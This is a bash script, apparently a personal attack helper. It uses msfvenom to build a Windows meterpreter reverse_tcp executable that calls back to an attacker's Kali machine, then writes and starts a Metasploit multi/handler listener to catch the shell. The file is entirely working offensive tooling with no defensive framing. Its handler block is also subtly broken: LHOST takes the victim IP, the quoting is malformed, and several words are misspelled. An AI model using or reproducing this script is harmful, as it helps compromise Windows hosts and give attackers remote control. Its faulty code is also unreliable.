#!/bin/bash

# User input
echo -n "Enter the Kali IP adress [ENTER]: "
read ip_k
echo -n "Enter the host IP adress [ENTER]: "
read ip_h
echo -n "Enter the port number [ENTER]: "
read port
echo -n "Enter the name of the program [ENTER]: "
read program

# Validation user input
echo
echo "Selected Kali IP is: $ip_k"
echo "Selected host IP is: $ip_h"
echo "Selected port is: $port"
echo "Selected program name is: $program"

# Payload generation
echo
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_k LPORT=$port --platform windows --arch x86 -f exe > $program.exe

# Validation creation payload program
check=($(ls | grep $program.exe))
echo "Program made :" $check

# Giving user option to start metaspoit attack
read -r -p "Did you start the created payload on the Windows host? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ ]]
then # start expoit
     echo "Starting the attack"
     echo "use exploit/multi/handler
     set PAYLOAD windows/meterpreter/reverse_tcp
     set LHOST" ""$ip_h"
     set LPORT" ""$port"
     set ExitOnSession false
     exploit -j -z" | tee listener.rc
     echo "Now Starting Msf multi/handler"
     msfconsole -r listener.rc

else
    echo "Start the metaspoit attack manually whenever you're ready"
fi
sleep 10
echo "Exiting "
